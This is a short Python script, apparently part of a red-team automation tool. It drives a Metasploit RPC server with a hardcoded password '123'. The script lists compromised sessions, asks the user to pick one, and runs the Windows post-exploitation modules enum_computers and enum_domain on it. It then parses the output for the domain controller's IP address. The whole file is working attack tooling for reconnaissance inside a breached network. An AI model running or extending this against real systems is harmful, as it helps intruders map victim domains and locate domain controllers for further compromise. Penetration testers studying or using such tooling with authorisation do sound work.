from library.pymetasploit3.msfrpc import MsfRpcClient

enum = [
'windows/gather/enum_computers', 
'windows/gather/enum_domain'
]

def init(client,sid):
    cid = client.consoles.console().cid
    dcip = ''
    for module in enum:
        post = client.modules.use('post', module)
        post['SESSION'] = int(sid)
        output = (client.consoles.console(cid).run_module_with_output(post).split('['))
        x=1
        while x < len(output):
            print("[{}".format(output[x]),end= '')
            if 'FOUND Domain Controller:' in output[x]:
                snippet = output[x].split('(IP: ')
                optoutput = snippet[1].split(')')
                dcip = optoutput[0]
            x+=1
    return dcip


if __name__ == '__main__':
    client = MsfRpcClient('123',port=55552)
    print("Select sessions to proceed: \n")
    if len(client.sessions.list.items())<1 :
        print("There are no sessions available")
        exit()
    for id,c in client.sessions.list.items():
        print("{})".format(id),"IP: {}".format(c.get('session_host')),"| {}".format(c.get('desc')),"{}".format(c.get('arch')))
    print("---------------------------------")
    sid = input()
    print("--------------------------------- \n")
    start=init(client,sid)